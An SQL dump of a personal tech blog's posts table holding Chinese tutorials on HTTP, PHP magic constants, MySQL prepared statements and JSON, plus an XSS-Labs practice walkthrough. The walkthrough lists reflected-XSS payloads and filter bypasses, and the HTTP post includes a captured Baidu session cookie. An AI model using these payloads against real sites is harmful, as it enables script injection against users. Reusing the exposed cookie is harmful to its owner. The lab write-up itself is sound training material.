/*
SQLyog 企业版 - MySQL GUI v8.14 
MySQL - 5.7.26 : Database - microblog
*********************************************************************
*/

/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`microblog` /*!40100 DEFAULT CHARACTER SET utf8 */;

USE `microblog`;

/*Table structure for table `posts` */

DROP TABLE IF EXISTS `posts`;

CREATE TABLE `posts` (
  `title` varchar(50) DEFAULT NULL,
  `author` varchar(20) DEFAULT NULL,
  `date` varchar(30) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `content` longtext,
  `heat` int(10) DEFAULT NULL,
  `id` varchar(30) DEFAULT NULL,
  `cover` varchar(200) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

/*Data for the table `posts` */

insert  into `posts`(`title`,`author`,`date`,`email`,`content`,`heat`,`id`,`cover`) values ('详解HTTP','admin','2022-12-13 19:02','652240843@qq.com','# http协议简介\r\n\r\n> `HTTP`协议(超文本传输协议HyperText Transfer Protocol)，它是基于TCP协议的应用层传输协议，简单来说就是客户端和服务端进行数据传输的一种规则。\r\n\r\n`http url`：\r\n\r\n```url\r\nhttp://host[\":\"port][abs_path]\r\n```\r\n\r\n# http请求头\r\n\r\n![RE](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/4/RE.png)\r\n\r\n**http**请求由请求行，消息报头，请求正文三部分构成。\r\n\r\n访问`baidu.com`，用burpsuite抓包，`request headers`如下：\r\n\r\n```http\r\nGET /home/other/data/weatherInfo?city=%E4%B9%9D%E6%B1%9F&indextype=manht&_req_seqid=0xaa4e1afd0028b863&asyn=1&t=1660183623070&sid= HTTP/1.1\r\nAccept: text/plain, */*; q=0.01\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-CN,zh;q=0.9\r\nConnection: keep-alive\r\nCookie: BIDUPSID=119642CD178BFA21589E1CB22D5CA9A7; PSTM=1659494222; BAIDUID=119642CD178BFA2112CD19D23E02A3D4:FG=1; BD_UPN=12314753; BA_HECTOR=008ka121a1208h2l2h8m58dv1hf7bh617; ZFY=sJnijftb:Bjr6fSMibAhSFO1sZ:AqUSVSzic:C; BDUSS_BFESS=i1DcM2toQ0h-Q093Skc5YlkybmlYUnkteVlSZ1lpcPeHRqSUFBQUFBJCQAAAAAAAAAAAEAAAAXz79~tPLG37j2urrX1tXmxNEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALOu82KzrvNiT; BDRCVFR[5ig7pqb-tu6]=mk3SLVN4HKm; BD_HOME=1; H_PS_PSSID=\r\nHost: www.baidu.com\r\nReferer: https://www.baidu.com/?tn=49055317_36_hao_pg\r\nSec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\r\nX-Requested-With: XMLHttpRequest\r\nsec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Windows\"\r\n```\r\n\r\n## 请求行\r\n\r\n**GET / HTTP/1.1** 方法是GET，协议版本http1.1\r\n\r\n| 方法    | 作用                                                         |\r\n| ------- | ------------------------------------------------------------ |\r\n| HEAD    | 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 |\r\n| POST    | 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。 |\r\n| GET     | 请求指定的页面信息，并返回实体主体。                         |\r\n| PUT     | 从客户端向服务器传送的数据取代指定的文档的内容。             |\r\n| DELETE  | 请求服务器删除指定的页面。                                   |\r\n| CONNECT | HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。    |\r\n| OPTIONS | 允许客户端查看服务器的性能。                                 |\r\n| TRACE   | 回显服务器收到的请求，主要用于测试或诊断。                   |\r\n| PATCH   | 是对 PUT 方法的补充，用来对已知资源进行局部更新 。           |\r\n\r\n## 消息报头\r\n\r\n\r\n\r\n| Header          | 解释                                                         |\r\n| --------------- | ------------------------------------------------------------ |\r\n| Accept          | 指定客户端能接收的内容类型                                   |\r\n| Accept-Charset  | 浏览器可以接收的字符编码集                                   |\r\n| Accept-Encoding | 指定浏览器可以支持的web服务器返回内容压缩编码类型            |\r\n| Accept-Language | 浏览器可接收的语言                                           |\r\n| Accept-Ranges   | 可以请求网页实体的一个或者多个子范围字段                     |\r\n| Authorization   | HTTP授权的授权证书类型                                       |\r\n| Cache-Control   | 指定请求和响应遵循的缓存机制                                 |\r\n| Connection      | 表示是否需要持久连接                                         |\r\n| Cookie          | [cookie](https://csuk1.github.io/2022/08/11/XSS跨站脚本攻击基础/#客户端的cookie) |\r\n| Content-Length  | 请求的内容长度                                               |\r\n| Content-Type    | 请求的与实体对应的MIME信息                                   |\r\n| User-Agent      | 初始化一个请求的客户机。它们是浏览器、编辑器或其它用户工具   |\r\n| Resource        | 由URI标识的网络数据对象或服务                                |\r\n| Message         | HTTP通讯的基本单位，包括一个结构化的八元组序列并通过连接传输 |\r\n| Entity          | 数据资源或来自服务资源的回映的一种特殊表示方法，它可能被包围在一个请求或响应信息中。一个实体包括实体头信息和实体的本身内容 |\r\n| Client          | 一个为发送请求目的而建立连接的应用程序                       |\r\n\r\n## 请求正文\r\n\r\n只有`POST`请求才有请求正文，`GET`方式并没有请求正文。\r\n\r\n`POST`请求正文实例：\r\n\r\n```http\r\nPOST / HTTP1.1\r\nHost: www.wrox.com\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\nConnection: Keep-Alive\r\n\r\nname=Professional%20Ajax&publisher=c\r\n```\r\n\r\n# http响应头\r\n\r\n![RH](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/4/RH.png)\r\n\r\nHTTP响应也由三部分组成，包括状态行，消息报头，响应正文。\r\n\r\n```http\r\nHTTP/1.1 200 OK\r\nCache-Control: private\r\nConnection: keep-alive\r\nContent-Encoding: gzip\r\nContent-Type: text/html;charset=utf-8\r\nDate: Thu, 11 Aug 2022 02:07:03 GMT\r\nExpires: Thu, 11 Aug 2022 02:07:03 GMT\r\nServer: BWS/1.0\r\nVary: Accept-Encoding\r\nTransfer-Encoding: chunked\r\n```\r\n\r\n状态行由三部分组成，包括http协议的版本，状态码以及对应状态码的文本描述。\r\n\r\n状态码由三位数字表示，\r\n\r\n `1xx`：**指示信息** - 表示请求已接收，继续处理\r\n\r\n`2xx`：**成功** - 表示请求已被成功接收、理解、接受 \r\n\r\n`3xx`：**重定向** - 要完成请求必须进行更进一步的操作\r\n\r\n`4xx`：**客户端错误** - 请求有语法错误或请求无法实现\r\n\r\n`5xx`：**服务器端错误** - 服务器未能实现合法的请求\r\n\r\n[*HTTP 状态码详解*](https://www.runoob.com/http/http-status-codes.html)\r\n\r\n# http协议的特点\r\n\r\n1. 支持**客户/服务器**模式\r\n2. **简单快速**：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有`GET`、`HEAD`、`POST`。每种方法规定了客户与服务器联系的类型不同。由于`HTTP`协议简单，使得`HTTP`服务器的程序规模小，因而通信速度很快。\r\n3. **灵活**：HTTP允许传输任意类型的数据对象。正在传输的类型由`Content-Type`加以标记。\r\n4. **无连接**：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。早期这么做的原因是请求资源少，追求快。后来通过`Connection: Keep-Alive`实现长连接。\r\n5. **无状态**：`HTTP`协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。',6,'1670929360898','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/7eb1b020e771f5a45db2b66b7ae73c23.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080'),('XSS-Labs之Level0-10','admin','2022-12-13 19:03','652240843@qq.com','# level 0\r\n\r\n> 靶场搭建\r\n\r\n下载至**phpstudy**中的**WWW**目录。\r\n\r\n下载地址：\r\n\r\n```bash\r\ngit clone https://github.com/do0dl3/xss-labs.git\r\n```\r\n\r\n打开**phpstudy**，启动**MySQL**和**Apache**服务。创建网站，根目录选择下载的文件。之后打开网站即可。\r\n\r\n![1](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/1.png)\r\n\r\n# level 1\r\n\r\n> 没有任何过滤\r\n\r\n在源码中找到我们传入的参数，发现插入到了元素`<h2>`中。直接给我们的`name`参数赋值一个简单的弹窗脚本，执行成功。这一关没有任何过滤，非常基础的反射型XSS。\r\n\r\n![2](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/2.png)\r\n\r\n# level 2\r\n\r\n> [`htmlspecialchars()`](https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp)\r\n>\r\n> 插入点在元素的属性\r\n\r\n按照第一题的思路，直接传参`<script>alert(/xss/)</script>`，发现没有跳出弹窗。查看源代码发现我们的传递的参数被`HTML实体编码`了。\r\n\r\n继续检查源代码，发现我们提交的参数赋值给了`<input>`元素的`value`，所以这里我们可以通过提前闭合，利用`on`事件执行一个简单的弹窗。\r\n\r\n![3](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/3.png)\r\n\r\n传递参数`1\" onmouseover=\"alert(/xss/)`，查看源码发现拼接成功。鼠标移动到该元素上跳出弹窗。\r\n\r\n![4](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/4.png)\r\n\r\n# level 3\r\n\r\n> 类似level 2\r\n\r\n与level 2有些许不同，构造参数`1\' onmouseover=\'alert(/xss/)`，查看源码发现拼接成功。同level 2跳出弹窗。\r\n\r\n![5](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/5.png)\r\n\r\n# level 4\r\n\r\n> 无意思\r\n>\r\n> 和level 2构造同样的参数即可\r\n\r\n![6](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/6.png)\r\n\r\n# level 5\r\n\r\n> `on`事件被过滤，拼接创建新元素，利用`JavaScript伪协议`\r\n\r\n继续使用上一关的参数，发现被过滤了`on`事件。\r\n\r\n![7](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/7.png)\r\n\r\n这个元素没办法拼接代码的话，那么通过构造参数新建一个元素来执行代码。构造参数`1\"><a href=\"javascript:alert(/xss/)\">click!</a><img src=\"`，这里没有过滤掉`javascript`，查看源代码发现拼接成功，点击<kbd>click!</kbd>即可跳出弹窗。\r\n\r\n![8](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/8.png)\r\n\r\n# level 6\r\n\r\n> 大小写绕过\r\n\r\n传入`1\" onmouseover=\"alert(/xss/)`，发现`on`被过滤了。\r\n\r\n![9](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/9.png)\r\n\r\n继续尝试`1\"><a href=\"javascript:alert(/xss/)\">click!</a><img src=\"`，发现`href`也被过滤了。\r\n\r\n![10](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/10.png)\r\n\r\n尝试大写绕过`1\"><a HREF=\"javascript:alert(/xss/)\">click!</a><img src=\"`,发现代码拼接成功.点击<kbd>click!</kbd>>即可跳出弹窗。\r\n\r\n![11](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/11.png)\r\n\r\n# level 7\r\n\r\n> 双写关键字\r\n\r\n尝试参数`1\" onmouseover=\"alert(/xss/)`，`on`又双叒叕被过滤了。\r\n\r\n![12](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/12.png)\r\n\r\n尝试创建新元素`1\"><a href=\"javascript:alert(/xss/)\">click!</a><img src=\"`，也不行。\r\n\r\n![13](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/13.png)\r\n\r\n尝试双写关键字，拼接成功，跳出弹窗。\r\n\r\n![14](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/14.png)\r\n\r\n# level 8\r\n\r\n> javascript伪协议+HTML实体编码绕过\r\n\r\n随便上传一个链接。\r\n\r\n![15](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/15.png)\r\n\r\n尝试下`javascript`伪协议。拼接的时候发现被插入了一个空格。尝试大写绕过，也不行。\r\n\r\n![16](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/16.png)\r\n\r\n试试[HTML实体编码](https://www.qqxiuzi.cn/bianma/zifushiti.php)绕过。\r\n\r\n```text\r\n&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#47;&#120;&#115;&#115;&#47;&#41;\r\n```\r\n\r\n拼接成功，点击弹出窗口。\r\n\r\n![17](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/17.png)\r\n\r\n# level 9\r\n\r\n> 类似level 8\r\n\r\n随便传入一串字符，发现不符合格式，需要`http://`才能成功传入。构造参数`javascript:alert(/xss/)//http://`，发现和level 8一样在`script`中间插入了一个空格，直接尝试**HTML实体编码**绕过，拼接成功，点击后弹出窗口。\r\n\r\n![18](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/18.png)\r\n\r\n# level 10\r\n\r\n> 隐藏表单\r\n\r\n检查源代码，发现有隐藏的输入框。同时给这些变量传值。\r\n\r\n```html\r\n<form id=\"search\">\r\n	<input name=\"t_link\" value=\"\" type=\"hidden\">\r\n	<input name=\"t_history\" value=\"\" type=\"hidden\">\r\n	<input name=\"t_sort\" value=\"\" type=\"hidden\">\r\n</form>\r\n```\r\n\r\n```url\r\nhttp://xss-labs/level10.php?keyword=well done!&t_link=a&t_history=b&t_sort=c\r\n```\r\n\r\n只有`t_sort`变量被赋值了。尝试传参重构这个元素。参数为`1\" type=\"\" onmouseover=\"alert(/xss/)`。\r\n\r\n![19](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/19.png)\r\n\r\n拼接成功，跳出弹窗。\r\n\r\n![20](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/7/20.png)',5,'1670929425459','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/b264ec415fddb65aac022e4ee7e9c6e5.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080'),('PHP魔术常量','admin','2022-12-13 19:08','652240843@qq.com','# 什么是PHP魔术常量\r\n\r\n`PHP` 向它运行的任何脚本提供了大量的预定义常量。很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。\r\n\r\n魔术常量准确来说并不能算是常量，常量被定义之后是不能被改变的。但是这些预定义的常量能够随着它们所在位置的变化而变化。\r\n\r\n这些特殊的常量并不区分大小写。\r\n\r\n# 魔术常量\r\n\r\n## `__LINE__`\r\n\r\n> 显示文件中的当前行号\r\n\r\n### 实例\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\necho \'这是第 \" \'  . __LINE__ . \' \" 行\';\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n在网页中显示如下图所示\r\n\r\n![1](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/1.png)\r\n\r\n## `__FILE__`\r\n\r\n> 文件的完整路径与文件名。\r\n>\r\n> 如果用在被包含文件中，则返回被包含的文件名。\r\n\r\n### 实例\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\necho \'该文件位于 \" \'  . __FILE__ . \' \" \';\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n在网页中的显示如下图所示：\r\n\r\n![2](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/2.png)\r\n\r\n## `__DIR__`\r\n\r\n> 文件所在的目录。\r\n>\r\n> 如果用在被包含的文件中，则返回被包含文件所在目录。\r\n\r\n### 实例\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\necho \'该文件位于 \" \'  . __DIR__ . \' \" \';\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n以上代码等价于：\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\necho \'该文件位于 \" \'  . dirname(__FILE__). \' \" \';\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n在网页中显示如下图：\r\n\r\n![3](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/3.png)\r\n\r\n## `__FUNCTION__`\r\n\r\n> 函数名称（`PHP 4.3.0 `加入）。自 `PHP 5` 起本常量返回该函数被定义时的名字（区分大小写）。在 `PHP 4` 中该值总是小写字母的。\r\n\r\n### 实例\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\nfunction test() {\r\n    echo  \'函数名为：\' . __FUNCTION__ ;\r\n}\r\ntest();\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n在网页中显示如下：\r\n\r\n![4](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/4.png)\r\n\r\n## `__CLASS__`\r\n\r\n> 类的名称（`PHP 4.3.0` 加入）。自 `PHP 5` 起本常量返回该类被定义时的名字。\r\n\r\n### 实例\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\nclass test {\r\n    function echo_class() {\r\n        echo \'类名为：\'  . __CLASS__ . \"<br>\";\r\n    }\r\n}\r\n$t = new test();\r\n$t->echo_class();\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n在网页中显示如图：\r\n\r\n![5](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/5.png)\r\n\r\n## `__TRAIT__`\r\n\r\n> `Trait` 的名字（`PHP 5.4.0` 新加）。自 `PHP 5.4.0` 起，`PHP` 实现了代码复用的一个方法，称为 `traits`。\r\n>\r\n> `Trait` 名包括其被声明的作用区域（例如 `Foo\\Bar`）。\r\n\r\n### **trait**\r\n\r\nPHP中使用trait关键字使一个类既可以集成基类的属性和方法，又可以拥有别的基类的方法。trait一般情况下和use搭配使用的。trait就是解决了继承只能继承一个基类的缺陷。\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\ntrait Drive {\r\n  public function driving() {\r\n    echo \"driving car\".\'<br>\';\r\n  }\r\n}\r\nclass Person {\r\n  public function eat() {\r\n    echo \"eat\".\'<br>\';\r\n  }\r\n}\r\nclass Student extends Person {\r\n  use Drive;\r\n  public function study() {\r\n    echo \"study\".\'<br>\';\r\n  }\r\n}\r\n$student = new Student();\r\n$student->study();\r\n$student->eat();\r\n$student->driving();\r\n\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n输出：\r\n\r\n![8](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/8.png)\r\n\r\n当方法或属性同名时，当前类中的方法会覆盖`trait`方法，而 `trait` 的方法又会覆盖了基类中的方法。如下所示，基类的方法被`trait`中的方法覆盖。\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\ntrait Drive {\r\n  public function driving() {\r\n    echo \"driving car\".\'<br>\';\r\n  }\r\n}\r\nclass Person {\r\n  public function driving() {\r\n    echo \"driving BMW\".\'<br>\';\r\n  }\r\n}\r\nclass Student extends Person {\r\n  use Drive;\r\n  public function study() {\r\n    echo \"study\".\'<br>\';\r\n  }\r\n}\r\n$student = new Student();\r\n$student->study();\r\n$student->driving();\r\n\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n![9](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/9.png)\r\n\r\n### 实例\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\ntrait Drive {\r\n  public function driving() {\r\n    echo \"driving car\".\'<br>\';\r\n  }\r\n  public function echo_trait() {\r\n    echo \"trait名为\".__TRAIT__.\'<br>\';\r\n  }\r\n}\r\nclass Person {\r\n  public function eat() {\r\n    echo \"eat\".\'<br>\';\r\n  }\r\n}\r\nclass Student extends Person {\r\n  use Drive;\r\n  public function study() {\r\n    echo \"study\".\'<br>\';\r\n  }\r\n}\r\n$student = new Student();\r\n$student->study();\r\n$student->eat();\r\n$student->driving();\r\n$student->echo_trait();\r\n\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n网页中的输出为：\r\n\r\n![10](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/10.png)\r\n\r\n## `__METHOD__`\r\n\r\n> 类的方法名（`PHP 5.0.0` 加入）。返回该方法被定义时的名字。\r\n\r\n### 实例\r\n\r\n```php\r\n<!DOCTYPE html>\r\n<html>\r\n<body>\r\n\r\n<h1>test</h1>\r\n\r\n<?php\r\nclass test {\r\n    function echo_method() {\r\n        echo \'函数名为：\'  . __METHOD__ . \"<br>\";\r\n    }\r\n}\r\nfunction _echo_method() {\r\n    echo  \'函数名为：\' . __METHOD__ ;\r\n}\r\n$t = new test();\r\n$t->echo_method();\r\n_echo_method();\r\n?>\r\n\r\n</body>\r\n</html>\r\n```\r\n\r\n在网页中显示如下：\r\n\r\n![6](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/6.png)\r\n\r\n## `__NAMESPACE__`\r\n\r\n> 当前命名空间的名称。\r\n>\r\n> 此常量在编译时定义。\r\n\r\n[什么是命名空间？](https://www.runoob.com/php/php-namespace.html)\r\n\r\n### 实例\r\n\r\n```php\r\n<?php\r\nnamespace MyProject;\r\n\r\necho \'命名空间为：\"\'. __NAMESPACE__ . \'\"\';\r\n?>\r\n```\r\n\r\n在网页中输出为：\r\n\r\n![11](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/12/11.png)',0,'1670929680767','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/f32906f9d848feb002cea4f605f388c9.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_2560%2ch_1440'),('MySQL预处理语句','admin','2022-12-13 19:09','652240843@qq.com','\r\n# 前言\r\n\r\nSQL语句的执行处理，分为**即时语句**和**预处理语句**。\r\n\r\n**即时语句**，顾名思义，一条**SQL**语句直接是走流程处理，一次编译，单次运行，此类普通语句被称作`Immediate Statements`（即时语句）。\r\n\r\n**预处理语句**(`Prepared Statements`，也称为**参数化语句**)只是一个**SQL**查询模板，其中包含占位符而不是实际参数值。在执行语句时，这些占位符将被实际值替换。预处理语句用于执行多个相同的**SQL**语句，并且执行效率更高。\r\n\r\n> 预处理语句能够有效地防御[**MySQL注入**](/168.html)。\r\n\r\n# 工作原理\r\n\r\n> 相比于直接执行**SQL**语句，预处理语句有如下优势：\r\n>\r\n> * 预处理语句大大减少了分析时间。一个预处理语句可以高效地重复执行同一条语句，因为该语句仅被再次解析一次。\r\n> * 绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。\r\n> * 使用不同的协议将参数值与查询分开发送到数据库服务器，保证了数据的合法性，有效地防范了**SQL**注入。因此**预处理语句**被认为是数据库安全性中最关键的元素之一。\r\n\r\n## 预处理\r\n\r\n创建**SQL**语句模板并发送到数据库。预留的值使用参数`?`标记 。\r\n\r\n例如：\r\n\r\n```sql\r\nINSERT INTO grade (id, name, phonenum, grades) VALUES(?, ?, ?, ?)\r\n```\r\n\r\n## 数据库解析\r\n\r\n服务端数据库解析，编译并对**SQL**语句模板执行查询优化和语法检查，并将其存储以备后用。\r\n\r\n## 执行\r\n\r\n执行阶段，参数值将发送到服务器，将绑定的值传递给参数（`?`标记）。服务端数据库将语句模板和这些值合成一个语句然后执行它。\r\n\r\n# PHP实现（Demo）\r\n\r\n`index.html`文件如下：\r\n\r\n```html\r\n<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <meta charset=\"utf-8\">\r\n    </head>\r\n    <body>\r\n        <form  action=\"db.php\" method=\"get\"> \r\n            学号：<input type=\"num\" name=\"id\"><br>\r\n            姓名：<input type=\"string\" name=\"name\"><br>\r\n            电话：<input type=\"string\" name=\"phonenum\"><br>\r\n            成绩：<input type=\"num\" name=\"grades\"><br>\r\n            <input type=\"submit\" value=\"提交\">\r\n        </form>\r\n    </body>\r\n</html>\r\n```\r\n\r\n`db.php`文件如下：\r\n\r\n```php\r\n<?php\r\n\r\n// 自己的数据库信息\r\n$servername = \"localhost\";\r\n$username = \"yourname\";\r\n$password = \"yourpassword\";\r\n$dbname = \"youdb\";\r\n \r\n// 创建连接\r\n$conn = new mysqli($servername, $username, $password, $dbname);\r\n \r\n// 检测连接\r\nif ($conn->connect_error) {\r\n    die(\"连接失败: \" . $conn->connect_error);\r\n}\r\n \r\n// 预处理及绑定\r\n$stmt = $conn->prepare(\"INSERT INTO grade (id, name, phonenum, grades) VALUES(?, ?, ?, ?)\"); \r\n$stmt->bind_param(\"issi\", $id, $name, $phonenum, $grades);\r\n \r\n// 设置参数并执行\r\nif (isset($_GET[\'id\'])&&isset($_GET[\'name\'])&&isset($_GET[\'phonenum\'])&&isset($_GET[\'grades\'])) {\r\n    $id = $_GET[\'id\'];\r\n    $name = $_GET[\'name\'];\r\n    $phonenum = $_GET[\'phonenum\'];\r\n    $grades = $_GET[\'grades\'];\r\n    $stmt->execute();\r\n    echo \"数据插入成功\";\r\n}\r\n    \r\n$stmt->close();\r\n$conn->close();\r\n?>\r\n```\r\n\r\n输入数据，点击提交。\r\n\r\n![1](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/15/1.png)\r\n\r\n查看数据库，发现插入成功。\r\n\r\n![2](https://tsuk1pic.oss-cn-chengdu.aliyuncs.com/15/2.png)\r\n\r\n## 代码解析\r\n\r\n在**SQL**语句中，我们使用了问号`?`，在此我们可以将问号替换为**整型**，**字符串**，**双精度浮点型**和**布尔型**。\r\n\r\n```php\r\n$stmt = $conn->prepare(\"INSERT INTO grade (id, name, phonenum, grades) VALUES(?, ?, ?, ?)\"); \r\n```\r\n\r\n`bind_param()`函数。该函数绑定了`SQL`的参数，且告诉数据库参数的值。`issi`参数列处理其余参数的数据类型。`s`字符告诉数据库该参数为字符串，`i`字符告诉数据库该参数为整型。后面的每个参数都需要为其指定类型。\r\n\r\n参数可以为以下四种类型：\r\n\r\n*  i - integer（整型）\r\n* d - double（双精度浮点型）\r\n* s - string（字符串）\r\n* b - BLOB（Binary Large Object：[二进制大对象](https://blog.csdn.net/qq_41162897/article/details/79486039)）\r\n\r\n```php\r\n$stmt->bind_param(\"issi\", $id, $name, $phonenum, $grades);\r\n```\r\n\r\n将用户通过`GET`方式传入的数据设为参数，然后`execute()`执行语句。\r\n\r\n```php\r\n$id = $_GET[\'id\'];\r\n$name = $_GET[\'name\'];\r\n$phonenum = $_GET[\'phonenum\'];\r\n$grades = $_GET[\'grades\'];\r\n$stmt->execute();\r\n```',4,'1670929742865','https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/984b1ca9b755943e4a647ab1786fe957.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_2560%2ch_1440'),('Javascript之JSON','admin','2022-12-13 19:10','652240843@qq.com','# 什么是JSON？\r\n\r\n`JSON`是**J**ava**S**cript **O**bject **N**otation的缩写，它是一种基于文本的轻量级数据交换格式。它是一门独立的语言。\r\n\r\n**PHP**、**JSP**、.**NET**等等编程语言都支持JSON。\r\n\r\n> JSON 使用 JavaScript 语法。但是 JSON 格式仅仅是一个文本。文本可以被任何编程语言读取及作为数据格式传递。\r\n\r\n# JSON的两种结构\r\n\r\n## 对象结构\r\n\r\nJSON对象保存在大括号中。可以存在多个`关键字/值`对。\r\n\r\n其中关键字是字符串，而值可以是字符串、数值、true、false、null、对象或数组。\r\n\r\n实例：\r\n\r\n```json\r\n{\r\n    \"firstname\": \"John\",\r\n    \"secondname\": \"Doe\",\r\n    \"age\": 20,\r\n}\r\n```\r\n\r\n\r\n\r\n## 数组结构\r\n\r\nJSON数组保存在中括号中。\r\n\r\n实例：\r\n\r\n**数组**\r\n\r\n```json\r\n[\r\n    \"John\", \r\n    \"Marry\",\r\n    \"Mark\"\r\n]\r\n```\r\n\r\n**对象中的数组**\r\n\r\n```json\r\n{\r\n    \"school\": \"1st school\",\r\n    \"teachers\":[\r\n    	{\"name\": \"Nick\", \"age\": 30},\r\n    	{\"name\": \"Marry\", \"age\": 35}\r\n	]\r\n}\r\n```\r\n\r\n# JavaScript中使用JSON\r\n\r\n> 因为JSON使用JavaScript语法，所以浏览器能直接处理JavaScript中的JSON。\r\n\r\n## 